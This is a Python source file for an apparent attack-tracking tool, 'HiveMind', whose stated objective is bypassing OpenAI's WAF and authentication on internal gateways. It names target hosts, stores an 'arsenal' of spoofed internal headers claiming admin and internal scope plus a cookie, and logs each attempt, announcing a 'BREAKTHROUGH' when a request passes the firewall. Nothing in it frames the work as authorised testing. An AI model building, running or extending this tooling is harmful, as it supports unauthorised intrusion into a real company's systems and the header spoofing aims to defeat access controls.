import json
import os
import datetime

class HiveMind:
    def __init__(self):
        self.brain_path = os.path.join(os.path.dirname(__file__), "Bypass_Brain.json")
        self.brain = self._load_brain()

    def _load_brain(self):
        if not os.path.exists(self.brain_path):
            return self._initialize_brain()
        try:
            with open(self.brain_path, 'r') as f:
                return json.load(f)
        except:
            return self._initialize_brain()

    def _initialize_brain(self):
        initial_state = {
            "meta": {
                "version": "1.0",
                "created_at": str(datetime.datetime.now()),
                "objective": "Bypass OpenAI WAF/Auth on Internal Gateways"
            },
            "targets": {
                "chat-onramp.unified-6.api.openai.com": {
                    "description": "Primary entry point for Stateful Responses API",
                    "status": "403 Forbidden",
                    "successful_bypass": False,
                    "tested_vectors": []
                },
                "higherlevelapi-canary": {
                    "description": "Control Plane (Internal)",
                    "status": "404 Not Found (Obfuscated)",
                    "successful_bypass": False,
                    "tested_vectors": []
                }
            },
            "arsenal": {
                "ghost_headers": {
                    "X-OpenAI-Client-User-Agent": "{\"bindings_version\": \"1.0.0\", \"httplib\": \"requests\", \"lang\": \"python\", \"lang_version\": \"3.10.0\", \"platform\": \"Windows\"}",
                    "X-OpenAI-Internal-ID": "canary-admin-001",
                    "X-Url-Path": "/v1/responses",
                    "X-OpenAI-Internal-Request-Id": "req_ZoharProbe_001",
                    "X-Authorization-Scope": "internal"
                },
                "cookies": {
                    "oai-did": "d41d8cd98f00b204e9800998ecf8427e"
                }
            }
        }
        self.save_brain(initial_state)
        return initial_state

    def save_brain(self, state=None):
        if state:
            self.brain = state
        with open(self.brain_path, 'w') as f:
            json.dump(self.brain, f, indent=4)
        print(f"[HiveMind] Brain synced to {self.brain_path}")

    def get_target(self, target_key):
        return self.brain["targets"].get(target_key, {})

    def get_arsenal(self):
        return self.brain["arsenal"]

    def add_target(self, target_key, description="Discovered via OSINT"):
        if target_key not in self.brain["targets"]:
            self.brain["targets"][target_key] = {
                "description": description,
                "status": "Untested",
                "successful_bypass": False,
                "tested_vectors": []
            }
            self.save_brain()
            print(f"[HiveMind] Added new target: {target_key}")

    def log_attempt(self, target_key, vector_name, result_code, payload_preview):
        target = self.brain["targets"].get(target_key)
        if not target:
            target = {"tested_vectors": [], "status": "Unknown"}
            self.brain["targets"][target_key] = target

        attempt_record = {
            "timestamp": str(datetime.datetime.now()),
            "vector": vector_name,
            "status_code": result_code,
            "payload_hash": str(hash(str(payload_preview)))[:8]
        }
        
        target["tested_vectors"].append(attempt_record)
        
        if result_code in [200, 201, 202, 401]: # 401 is "Good" because it means we passed WAF
            target["status"] = f"OPEN ({result_code})"
            target["successful_bypass"] = True
            print(f"[HiveMind] 🚨 BREAKTHROUGH on {target_key}: {result_code}")
        else:
            print(f"[HiveMind] Logged attempt on {target_key}: {result_code}")
            
        self.save_brain()

if __name__ == "__main__":
    mind = HiveMind()
    print(json.dumps(mind.brain, indent=2))
